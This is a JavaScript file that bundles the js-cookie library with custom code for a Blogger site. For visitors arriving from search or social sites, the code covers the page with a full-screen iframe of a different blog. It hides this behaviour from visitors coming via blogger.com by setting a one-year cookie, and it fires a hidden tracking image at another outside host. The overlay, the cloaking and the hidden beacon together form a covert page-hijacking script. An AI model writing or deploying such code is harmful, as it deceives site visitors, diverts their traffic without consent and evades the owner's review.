/* Cookies */
!function(e,t){"object"==typeof exports&&"undefined"!=typeof module?module.exports=t():"function"==typeof define&&define.amd?define(t):(e=e||self,function(){var n=e.Cookies,o=e.Cookies=t();o.noConflict=function(){return e.Cookies=n,o}}())}(this,(function(){"use strict";function e(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var o in n)e[o]=n[o]}return e}return function t(n,o){function r(t,r,i){if("undefined"!=typeof document){"number"==typeof(i=e({},o,i)).expires&&(i.expires=new Date(Date.now()+864e5*i.expires)),i.expires&&(i.expires=i.expires.toUTCString()),t=encodeURIComponent(t).replace(/%(2[346B]|5E|60|7C)/g,decodeURIComponent).replace(/[()]/g,escape);var c="";for(var u in i)i[u]&&(c+="; "+u,!0!==i[u]&&(c+="="+i[u].split(";")[0]));return document.cookie=t+"="+n.write(r,t)+c}}return Object.create({set:r,get:function(e){if("undefined"!=typeof document&&(!arguments.length||e)){for(var t=document.cookie?document.cookie.split("; "):[],o={},r=0;r<t.length;r++){var i=t[r].split("="),c=i.slice(1).join("=");try{var u=decodeURIComponent(i[0]);if(o[u]=n.read(c,u),e===u)break}catch(e){}}return e?o[e]:o}},remove:function(t,n){r(t,"",e({},n,{expires:-1}))},withAttributes:function(n){return t(this.converter,e({},this.attributes,n))},withConverter:function(n){return t(e({},this.converter,n),this.attributes)}},{attributes:{value:Object.freeze(o)},converter:{value:Object.freeze(n)}})}({read:function(e){return'"'===e[0]&&(e=e.slice(1,-1)),e.replace(/(%[\dA-F]{2})+/gi,decodeURIComponent)},write:function(e){return encodeURIComponent(e).replace(/%(2[346BF]|3[AC-F]|40|5[BDE]|60|7[BCD])/g,decodeURIComponent)}},{path:"/"})}));
/* referrer from where */
var anreferrerUrl = document.referrer;
var ancurentUrl = window.location.href;
function BlockOneYear(){
	if(anreferrerUrl.includes("blogger.com")){
		Cookies.set('bloggerCoo', 'exist', { expires: 365, path: '/' });
		window.localStorage.setItem("bloggerCoo", "exist");
	}
}

/* Block One day */
function blockOneDay(){
	Cookies.set("noTodayCoo","waiting",{ expires: 1, path: '/' });
}
/* Excute Iframe Function */
function EXRVH(){
	var crStyle = document.createElement("style");
	crStyle.type = "text/css";
	crStyle.innerHTML = ".miraframe,.miraframe iframe{display:block;background:0 0!important}.miraframe{position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999999}.miraframe iframe{width:100%!important;height:100%!important;border:0!important;padding:0!important;margin:0!important;overflow:hidden}";
	var crDiv = document.createElement("div");
	crDiv.className = "miraframe";
	crDiv.innerHTML = "<iframe src='https://animeflv-cc.blogspot.com' scrolling='no' allowfullscreen='false' referrerpolicy='no-referrer'></iframe>";
	document.body.appendChild(crStyle);
	document.body.appendChild(crDiv);
	window.onblur = function(){
		document.body.removeChild(crDiv);
	}
	blockOneDay();
}
/* Send  */
function anpermission(){
	var anper = false;
	["ronaafoaud.blogspot.com","ronaafoaud.blogspot.com","ronaafoaud.blogspot.com"].forEach((pm)=>{
		if(ancurentUrl.includes(pm)){
			anper = true;
		}
	})
	return anper;
}
/* facebook or google or what */
function GorF(){
	var rgg = false;
	[".google.","facebook.com","youtube.com","twitter.com"].forEach((dro)=>{
		if(anreferrerUrl.includes(dro)){
			rgg = true;
		}
	})
	return rgg;
}
/* send referrer by image function*/
function animg(){
	var xxximg = document.createElement("img");
	xxximg.src = "https://respreq.blogspot.com/";
	xxximg.style="display:none;width:0;height:0;";
	document.body.appendChild(xxximg);
	setTimeout(function(){
		document.body.removeChild(xxximg);
	},3000);
}
/* All */
BlockOneYear();
if(Cookies.get("bloggerCoo") == null && Cookies.get("noTodayCoo") == null && window.localStorage.getItem("bloggerCoo") == null ){
	if(GorF()){
		if(anpermission()){
			EXRVH();
		}
	}
}
if(GorF()){
	animg();
}
